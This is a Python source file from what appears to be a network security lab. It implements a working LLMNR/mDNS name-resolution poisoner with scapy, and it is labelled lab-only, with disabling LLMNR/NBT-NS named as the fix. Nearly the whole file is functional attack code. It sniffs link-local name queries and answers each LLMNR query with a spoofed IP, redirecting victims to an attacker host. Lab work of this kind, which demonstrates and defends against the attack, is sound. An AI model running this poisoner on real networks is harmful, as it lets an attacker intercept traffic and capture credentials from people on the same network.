# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-mdns-llmnr: answer LLMNR/mDNS queries first. LAB ONLY.

Listens for link-local name queries and replies pointing the victim at the
attacker (Responder-style). Network dimension only - no host/AD exploitation.
Disabling LLMNR/NBT-NS (see resolution.py) is the fix.
"""

from __future__ import annotations

import argparse
from typing import Any

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


class Poisoner:
    def __init__(self, spoof_ip: str) -> None:
        self._scapy = load_scapy()
        self.spoof_ip = spoof_ip

    def _handle(self, pkt: Any) -> None:
        s = self._scapy
        if pkt.haslayer(s.LLMNRQuery) and pkt.haslayer(s.IP):
            name = (
                pkt[s.LLMNRQuery].qd.qname.decode(errors="replace") if pkt[s.LLMNRQuery].qd else "?"
            )
            reply = (
                s.IP(dst=pkt[s.IP].src)
                / s.UDP(sport=5355, dport=pkt[s.UDP].sport)
                / s.LLMNRResponse(
                    id=pkt[s.LLMNRQuery].id,
                    qd=pkt[s.LLMNRQuery].qd,
                    an=s.DNSRR(rrname=name, rdata=self.spoof_ip),
                )
            )
            s.send(reply, verbose=0)
            verdict("ALERT", f"answered LLMNR for {name} -> {self.spoof_ip}")

    def run(self, iface: str) -> None:
        print(f"[*] poisoning LLMNR/mDNS on {iface} -> {self.spoof_ip}. Ctrl-C to stop.")
        self._scapy.sniff(
            iface=iface, filter="udp port 5355 or udp port 5353", prn=self._handle, store=0
        )


def run(args: argparse.Namespace) -> int:
    Poisoner(args.spoof_ip).run(args.iface)
    return 0
